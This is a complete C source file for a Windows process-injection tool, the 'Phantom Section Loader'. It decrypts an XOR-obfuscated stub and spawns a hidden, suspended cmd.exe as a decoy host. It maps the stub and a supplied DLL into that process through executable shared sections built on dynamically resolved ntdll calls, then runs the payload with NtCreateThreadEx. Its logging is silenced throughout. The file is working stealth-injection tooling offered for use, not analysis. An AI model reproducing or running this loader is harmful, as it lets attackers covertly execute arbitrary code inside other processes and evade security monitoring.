/*
 * siren.c — Phantom Section Loader
 * Author: Rafael Dornelas
 * License: MIT
 */

#include "siren.h"
#include "sr_stub_gen.h"

#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define LOG(fmt, ...) ((void)0)
#define OK(fmt, ...)  ((void)0)
#define ERR(fmt, ...) ((void)0)

/* ══════════════════════════════════════════════════════════════════════
 * §1  PE VALIDATION
 * ══════════════════════════════════════════════════════════════════════ */

#define SR_PE_DOS_SIG       0x5A4Du
#define SR_PE_NT_SIG        0x00004550u
#define SR_PE_OPT_PE32PLUS  0x020Bu
#define SR_PE_MACHINE_AMD64 0x8664u

#pragma pack(push, 1)
typedef struct { uint16_t e_magic; uint16_t _p[29]; uint32_t e_lfanew; } sr_dos;
typedef struct { uint16_t Machine; uint16_t NumberOfSections;
                 uint32_t _ts; uint32_t _ps; uint32_t _ns;
                 uint16_t SizeOfOptionalHeader; uint16_t _ch; } sr_fhdr;
typedef struct { uint32_t VirtualAddress; uint32_t Size; } sr_ddir;
typedef struct {
    uint16_t Magic; uint8_t _lv[2]; uint32_t _cs[3];
    uint32_t AddressOfEntryPoint; uint32_t BaseOfCode;
    uint64_t ImageBase; uint32_t SectionAlignment; uint32_t FileAlignment;
    uint16_t _ver[8]; uint32_t SizeOfImage; uint32_t SizeOfHeaders;
    uint32_t CheckSum; uint16_t _ss[2]; uint64_t _stack[2]; uint64_t _heap[2];
    uint32_t _lf; uint32_t NumberOfRvaAndSizes;
    sr_ddir DataDirectory[16];
} sr_opt64;
typedef struct { uint32_t Signature; sr_fhdr FileHeader; sr_opt64 OptionalHeader; } sr_nt64;
typedef struct {
    uint8_t Name[8]; uint32_t VirtualSize; uint32_t VirtualAddress;
    uint32_t SizeOfRawData; uint32_t PointerToRawData;
    uint32_t _pr; uint32_t _pl; uint16_t _nr; uint16_t _nl;
    uint32_t Characteristics;
} sr_sec;
typedef struct {
    uint32_t OriginalFirstThunk;
    uint32_t TimeDateStamp;
    uint32_t ForwarderChain;
    uint32_t Name;
    uint32_t FirstThunk;
} sr_imp_desc;
#pragma pack(pop)

static int sr_range_ex(size_t a, size_t b, size_t lim) {
    return b > lim ? 1 : a > lim - b;
}
static int sr_pow2(uint32_t v) { return v != 0 && (v & (v-1)) == 0; }

static siren_status_t sr_pe_validate(const void *buf, size_t sz)
{
    if (!buf || sz < sizeof(sr_dos)) return SIREN_E_PE_TRUNCATED;
    const uint8_t *b = (const uint8_t *)buf;
    const sr_dos *d = (const sr_dos *)b;
    if (d->e_magic != SR_PE_DOS_SIG) return SIREN_E_PE_BAD_DOS;
    uint32_t noff = d->e_lfanew;
    if (sr_range_ex(noff, sizeof(sr_nt64), sz)) return SIREN_E_PE_TRUNCATED;
    const sr_nt64 *nt = (const sr_nt64 *)(b + noff);
    if (nt->Signature != SR_PE_NT_SIG) return SIREN_E_PE_BAD_NT;
    if (nt->FileHeader.Machine != SR_PE_MACHINE_AMD64) return SIREN_E_PE_WRONG_ARCH;
    if (nt->OptionalHeader.Magic != SR_PE_OPT_PE32PLUS) return SIREN_E_PE_WRONG_ARCH;
    if (!sr_pow2(nt->OptionalHeader.SectionAlignment) ||
        !sr_pow2(nt->OptionalHeader.FileAlignment))
        return SIREN_E_PE_BAD_NT;
    uint32_t soff = noff + (uint32_t)offsetof(sr_nt64, OptionalHeader)
                  + nt->FileHeader.SizeOfOptionalHeader;
    uint16_t sc = nt->FileHeader.NumberOfSections;
    if (sc == 0) return SIREN_E_PE_BAD_NT;
    if (sr_range_ex(soff, (size_t)sc * sizeof(sr_sec), sz))
        return SIREN_E_PE_TRUNCATED;
    const sr_sec *secs = (const sr_sec *)(b + soff);
    for (uint16_t i = 0; i < sc; i++) {
        if (secs[i].SizeOfRawData > 0 &&
            (size_t)(secs[i].PointerToRawData + secs[i].SizeOfRawData) > sz)
            return SIREN_E_PE_TRUNCATED;
    }
    return SIREN_OK;
}

/* ══════════════════════════════════════════════════════════════════════
 * §2  STUB DECRYPTION
 * ══════════════════════════════════════════════════════════════════════ */

static void sr_decrypt_blob(unsigned char *out)
{
    uint32_t kf[4] = { SR_CFG_STACK, SR_CFG_HEAP, SR_CFG_ALIGN, SR_CFG_FLAGS };
    unsigned char key[16];
    memcpy(key, kf, 16);
    for (unsigned i = 0; i < SR_BLOB_SIZE; i++) {
        unsigned char k = key[i % 16] ^ ((i * 7 + 3) & 0xFF);
        out[i] = sr_enc[i] ^ k;
    }
    SecureZeroMemory(key, sizeof(key));
    SecureZeroMemory(kf, sizeof(kf));
}

static size_t sr_blob_aligned(void) {
    return (SR_BLOB_SIZE + SR_BLOB_ALIGN - 1u) & ~(SR_BLOB_ALIGN - 1u);
}

/* ══════════════════════════════════════════════════════════════════════
 * §3  SECTION CARRIER (NtCreateSection + NtMapViewOfSection)
 * ══════════════════════════════════════════════════════════════════════ */

#ifndef SEC_COMMIT
#  define SEC_COMMIT 0x8000000
#endif
#define VIEW_UNMAP 2u

typedef LONG (NTAPI *PFN_NtCreateSection)(
    PHANDLE, ACCESS_MASK, void *, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef LONG (NTAPI *PFN_NtMapViewOfSection)(
    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
    PSIZE_T, DWORD, ULONG, ULONG);
typedef LONG (NTAPI *PFN_NtUnmapViewOfSection)(HANDLE, PVOID);
typedef LONG (NTAPI *PFN_NtClose)(HANDLE);

static PFN_NtCreateSection      g_NtCreateSection;
static PFN_NtMapViewOfSection   g_NtMapViewOfSection;
static PFN_NtUnmapViewOfSection g_NtUnmapViewOfSection;
static PFN_NtClose              g_NtClose;
static BOOL                     g_nt_resolved;

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"

static BOOL sr_resolve_nt(void)
{
    if (g_nt_resolved) return TRUE;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;
    g_NtCreateSection      = (PFN_NtCreateSection)
        GetProcAddress(ntdll, "NtCreateSection");
    g_NtMapViewOfSection   = (PFN_NtMapViewOfSection)
        GetProcAddress(ntdll, "NtMapViewOfSection");
    g_NtUnmapViewOfSection = (PFN_NtUnmapViewOfSection)
        GetProcAddress(ntdll, "NtUnmapViewOfSection");
    g_NtClose              = (PFN_NtClose)
        GetProcAddress(ntdll, "NtClose");
    g_nt_resolved = g_NtCreateSection && g_NtMapViewOfSection &&
                    g_NtUnmapViewOfSection && g_NtClose;
    return g_nt_resolved;
}

#pragma GCC diagnostic pop

static siren_status_t sr_carrier_map(HANDLE       hProcess,
                                     const void  *pe_bytes,
                                     size_t       pe_size,
                                     void       **out_stub_addr,
                                     void       **out_local_view,
                                     HANDLE      *out_section)
{
    if (!hProcess || !pe_bytes || pe_size == 0 || !out_stub_addr)
        return SIREN_E_NULL_ARG;

    *out_stub_addr = NULL;

    if (!sr_resolve_nt())
        return SIREN_E_CARRIER_ALLOC;

    size_t blob_sz  = sr_blob_aligned();
    size_t total_sz = blob_sz + pe_size;

    HANDLE hSection = NULL;
    LARGE_INTEGER max_size;
    max_size.QuadPart = (LONGLONG)total_sz;

    LONG status = g_NtCreateSection(
        &hSection, SECTION_ALL_ACCESS, NULL, &max_size,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    if (status < 0 || !hSection)
        return SIREN_E_CARRIER_ALLOC;

    PVOID  local_view = NULL;
    SIZE_T view_sz    = 0;

    status = g_NtMapViewOfSection(
        hSection, GetCurrentProcess(), &local_view,
        0, 0, NULL, &view_sz, VIEW_UNMAP, 0, PAGE_READWRITE);

    if (status < 0 || !local_view) {
        g_NtClose(hSection);
        return SIREN_E_CARRIER_MAP;
    }

    unsigned char *base = (unsigned char *)local_view;
    memset(base, 0, blob_sz);

    unsigned char stub_plain[SR_BLOB_SIZE];
    sr_decrypt_blob(stub_plain);
    memcpy(base, stub_plain, SR_BLOB_SIZE);
    SecureZeroMemory(stub_plain, sizeof(stub_plain));

    uint32_t offset32 = (uint32_t)blob_sz;
    memcpy(base + SR_BLOB_PATCH, &offset32, sizeof(offset32));

    memcpy(base + blob_sz, pe_bytes, pe_size);

    PVOID  target_base    = NULL;
    SIZE_T target_view_sz = 0;

    status = g_NtMapViewOfSection(
        hSection, hProcess, &target_base,
        0, 0, NULL, &target_view_sz, VIEW_UNMAP, 0, PAGE_EXECUTE_READWRITE);

    if (status < 0 || !target_base) {
        g_NtUnmapViewOfSection(GetCurrentProcess(), local_view);
        g_NtClose(hSection);
        return SIREN_E_CARRIER_MAP;
    }

    *out_stub_addr  = target_base;
    *out_local_view = local_view;
    *out_section    = hSection;
    return SIREN_OK;
}

/* ══════════════════════════════════════════════════════════════════════
 * §4  PUBLIC API
 * ══════════════════════════════════════════════════════════════════════ */

siren_status_t siren_inject(HANDLE                hProcess,
                            const void           *pe_bytes,
                            size_t                pe_size,
                            siren_inject_options *opts)
{
    if (!hProcess || hProcess == INVALID_HANDLE_VALUE)
        return SIREN_E_NULL_ARG;
    if (!pe_bytes || pe_size < sizeof(sr_dos))
        return SIREN_E_BAD_SIZE;

    siren_status_t r = sr_pe_validate(pe_bytes, pe_size);
    if (SIREN_FAILED(r)) return r;

    void  *stub_addr  = NULL;
    void  *local_view = NULL;
    HANDLE hSection   = NULL;
    r = sr_carrier_map(hProcess, pe_bytes, pe_size, &stub_addr, &local_view, &hSection);
    if (SIREN_FAILED(r)) return r;

    if (opts) {
        opts->out_stub_addr       = stub_addr;
        opts->out_entry_offset    = SR_BLOB_ENTRY;
        opts->out_local_view      = local_view;
        opts->out_section         = hSection;
        opts->out_progress_offset = SR_BLOB_PROGRESS;
    }
    return SIREN_OK;
}

/* ══════════════════════════════════════════════════════════════════════
 * §5  FILE I/O
 * ══════════════════════════════════════════════════════════════════════ */

static void *read_file(const char *path, size_t *out_size)
{
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;

    LARGE_INTEGER li;
    if (!GetFileSizeEx(hf, &li) || li.QuadPart == 0 || li.QuadPart > 64*1024*1024) {
        CloseHandle(hf);
        return NULL;
    }

    void *buf = malloc((size_t)li.QuadPart);
    if (!buf) { CloseHandle(hf); return NULL; }

    DWORD nread = 0;
    if (!ReadFile(hf, buf, (DWORD)li.QuadPart, &nread, NULL) ||
        nread != (DWORD)li.QuadPart) {
        free(buf);
        CloseHandle(hf);
        return NULL;
    }

    CloseHandle(hf);
    *out_size = (size_t)nread;
    return buf;
}

/* ══════════════════════════════════════════════════════════════════════
 * §6  IMPORT PRE-LOADER & IAT RESOLVER
 * ══════════════════════════════════════════════════════════════════════ */

typedef LONG (NTAPI *PFN_NtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

static uint32_t rva_to_foff(const unsigned char *b, size_t pe_sz,
                             uint32_t nt_off, uint32_t rva)
{
    uint16_t nsec, optsz;
    memcpy(&nsec,  b + nt_off + 0x06, 2);
    memcpy(&optsz, b + nt_off + 0x14, 2);
    uint32_t shdr = nt_off + 0x18 + optsz;
    for (uint16_t i = 0; i < nsec; i++, shdr += 40) {
        if (shdr + 40 > (uint32_t)pe_sz) break;
        uint32_t vsz, va, rawsz, rawoff;
        memcpy(&vsz,    b + shdr + 0x08, 4);
        memcpy(&va,     b + shdr + 0x0C, 4);
        memcpy(&rawsz,  b + shdr + 0x10, 4);
        memcpy(&rawoff, b + shdr + 0x14, 4);
        uint32_t span = vsz ? vsz : rawsz;
        if (rva >= va && rva < va + span) {
            uint32_t off = rawoff + (rva - va);
            return (off + 1 <= (uint32_t)pe_sz) ? off : 0;
        }
    }
    return 0;
}

static void preload_imports(const void *pe, size_t pe_sz,
                            HANDLE hProcess,
                            void *local_view,
                            const void *remote_base,
                            PFN_NtCreateThreadEx pfnNtEx)
{
    const unsigned char *b = (const unsigned char *)pe;
    if (pe_sz < 0xA0) return;

    uint32_t nt_off;
    memcpy(&nt_off, b + 0x3C, 4);
    if ((uint64_t)nt_off + 0xA0 > pe_sz) return;

    uint32_t imp_rva;
    memcpy(&imp_rva, b + nt_off + 0x90, 4);
    if (!imp_rva) return;

    uint32_t imp_foff = rva_to_foff(b, pe_sz, nt_off, imp_rva);
    if (!imp_foff) return;

    FARPROC pfnLoadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pfnLoadLib)
        pfnLoadLib = GetProcAddress(GetModuleHandleA("kernelbase.dll"), "LoadLibraryA");
    if (!pfnLoadLib) return;

    unsigned char *name_buf    = (unsigned char *)local_view  + SR_BLOB_SIZE;
    const char    *name_remote = (const char *)remote_base    + SR_BLOB_SIZE;
    size_t gap  = SR_BLOB_ALIGN - SR_BLOB_SIZE;
    size_t boff = 0;

    const sr_imp_desc *d = (const sr_imp_desc *)(b + imp_foff);
    while ((const unsigned char *)(d + 1) <= b + pe_sz) {
        if (!d->Name) break;

        uint32_t nfoff = rva_to_foff(b, pe_sz, nt_off, d->Name);
        if (!nfoff) { d++; continue; }

        const char *dll_name = (const char *)(b + nfoff);
        size_t nlen = 0;
        while (nlen < 260 && dll_name[nlen]) nlen++;
        if (!nlen || nlen == 260 || boff + nlen + 1 > gap) { d++; continue; }

        memcpy(name_buf + boff, dll_name, nlen + 1);
        void *rname = (void *)((const char *)name_remote + boff);
        boff += nlen + 1;

        HANDLE ht = NULL;
        LONG st = pfnNtEx(&ht, THREAD_ALL_ACCESS, NULL,
                          hProcess, (PVOID)pfnLoadLib, rname,
                          0, 0, 0, 0, NULL);
        if (st >= 0 && ht) {
            WaitForSingleObject(ht, 5000);
            CloseHandle(ht);
        }
        d++;
    }
}

static void resolve_iat(const void *pe, size_t pe_sz,
                        void *local_view,
                        size_t blob_off,
                        size_t progress_off)
{
    const unsigned char *b  = (const unsigned char *)pe;
    unsigned char *lv_pe    = (unsigned char *)local_view + blob_off;

    uint32_t nt_off;
    memcpy(&nt_off, b + 0x3C, 4);
    if ((uint64_t)nt_off + 0xA0 > pe_sz) return;

    uint32_t imp_rva;
    memcpy(&imp_rva, b + nt_off + 0x90, 4);
    if (!imp_rva) return;

    uint32_t imp_foff = rva_to_foff(b, pe_sz, nt_off, imp_rva);
    if (!imp_foff) return;

    const sr_imp_desc *d = (const sr_imp_desc *)(b + imp_foff);

    while ((const unsigned char *)(d + 1) <= b + pe_sz) {
        if (!d->Name) break;

        uint32_t nfoff = rva_to_foff(b, pe_sz, nt_off, d->Name);
        if (!nfoff) { d++; continue; }
        const char *dll_name = (const char *)(b + nfoff);

        HMODULE hMod = GetModuleHandleA(dll_name);
        if (!hMod) hMod = LoadLibraryA(dll_name);
        if (!hMod) { d++; continue; }

        uint32_t ilt_rva = d->OriginalFirstThunk ? d->OriginalFirstThunk
                                                  : d->FirstThunk;
        uint32_t iat_rva = d->FirstThunk;

        uint32_t ilt_foff = rva_to_foff(b, pe_sz, nt_off, ilt_rva);
        uint32_t iat_foff = rva_to_foff(b, pe_sz, nt_off, iat_rva);
        if (!ilt_foff || !iat_foff) { d++; continue; }

        const unsigned char *ilt = b + ilt_foff;
        unsigned char       *iat = lv_pe + iat_foff;

        while (ilt + 8 <= b + pe_sz) {
            uint64_t thunk;
            memcpy(&thunk, ilt, 8);
            if (!thunk) break;

            FARPROC fn = NULL;
            if (thunk >> 63) {
                fn = GetProcAddress(hMod, MAKEINTRESOURCEA((WORD)(thunk & 0xFFFF)));
            } else {
                uint32_t ibn_rva  = (uint32_t)(thunk & 0xFFFFFFFF);
                uint32_t ibn_foff = rva_to_foff(b, pe_sz, nt_off, ibn_rva);
                if (ibn_foff + 2 < pe_sz)
                    fn = GetProcAddress(hMod, (const char *)(b + ibn_foff + 2));
            }

            uint64_t va = fn ? (uint64_t)(uintptr_t)fn : 0ULL;
            memcpy(iat, &va, 8);
            ilt += 8;
            iat += 8;
        }
        d++;
    }

    /* Signal stub to skip its import resolution (S7) */
    unsigned char *skip_flag = (unsigned char *)local_view + progress_off + 4;
    *skip_flag = 1;
}

/* ══════════════════════════════════════════════════════════════════════
 * §7  INJECTION LOGIC
 * ══════════════════════════════════════════════════════════════════════ */

static BOOL inject_suspended_child(const void *dll_bytes, size_t dll_size)
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"
    PFN_NtCreateThreadEx pfnNtCreateThreadEx = (PFN_NtCreateThreadEx)
        GetProcAddress(ntdll, "NtCreateThreadEx");
#pragma GCC diagnostic pop

    if (!pfnNtCreateThreadEx) return FALSE;

    DWORD seed = GetTickCount();
    BYTE a = (BYTE)(((seed >> 0)  % 223) + 1);
    BYTE b = (BYTE)( (seed >> 8)  % 256);
    BYTE c = (BYTE)( (seed >> 16) % 256);
    BYTE d = (BYTE)(((seed >> 24) % 254) + 1);
    if (a == 10 || a == 127) a = 203;

    wchar_t cmdline[128];
    wsprintfW(cmdline, L"cmd.exe /c ping -t %d.%d.%d.%d >nul 2>&1",
              a, b, c, d);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi))
        return FALSE;

    siren_inject_options opts = { 0 };
    siren_status_t r = siren_inject(pi.hProcess, dll_bytes, dll_size, &opts);

    BOOL ok = FALSE;
    if (SIREN_FAILED(r)) {
        TerminateProcess(pi.hProcess, 1);
        goto cleanup;
    }

    ResumeThread(pi.hThread);
    Sleep(3000);

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    if (exitCode != STILL_ACTIVE) goto cleanup;

    preload_imports(dll_bytes, dll_size,
                    pi.hProcess,
                    opts.out_local_view,
                    opts.out_stub_addr,
                    pfnNtCreateThreadEx);

    resolve_iat(dll_bytes, dll_size,
                opts.out_local_view,
                SR_BLOB_ALIGN,
                opts.out_progress_offset);

    if (opts.out_stub_addr) {
        void *entry = (char *)opts.out_stub_addr + opts.out_entry_offset;
        HANDLE hRemote = NULL;
        LONG st = pfnNtCreateThreadEx(
            &hRemote, THREAD_ALL_ACCESS, NULL,
            pi.hProcess, entry, NULL,
            0, 0, 0, 0, NULL);

        if (st >= 0 && hRemote) {
            CloseHandle(hRemote);
            ok = TRUE;
        }
    }

cleanup:
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return ok;
}

/* ══════════════════════════════════════════════════════════════════════
 * §8  ENTRY POINT
 * ══════════════════════════════════════════════════════════════════════ */

int main(int argc, char *argv[])
{
    if (argc < 2) return 1;

    size_t dll_size  = 0;
    void  *dll_bytes = read_file(argv[1], &dll_size);
    if (!dll_bytes) return 1;

    BOOL injected = inject_suspended_child(dll_bytes, dll_size);

    free(dll_bytes);
    return injected ? 0 : 1;
}
